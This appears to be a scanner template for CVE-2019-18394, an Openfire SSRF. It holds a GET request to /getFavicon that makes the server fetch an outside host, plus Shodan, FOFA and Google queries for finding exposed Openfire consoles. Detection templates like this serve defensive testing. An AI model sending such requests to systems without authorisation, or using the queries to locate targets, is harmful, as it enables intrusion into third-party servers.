id: CVE-2019-18394

info:
  name: Openfire Full Read SSRF
  author: su
  severity: critical
  verified: false
  description: |
    Openfire 4.4.0 and before allows remote attackers to read arbitrary files from the server via a crafted request to the /getFavicon endpoint.
    shodan: http.title:"openfire admin console" || http.title:"openfire"
    fofa: itle="openfire" || title="openfire admin console"
    google: intitle:"openfire" || intitle:"openfire admin console"
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-18394
  tags: cve,cve2019,openfire,ssrf
  created: 2023/08/10

rules:
  r0:
    request:
      method: GET
      path: /getFavicon?host=example.com/?
    expression: response.status == 200 && response.headers['content-type'].contains("image/x-icon") && response.body.bcontains(b'<title>Example Domain</title>')
expression: r0()
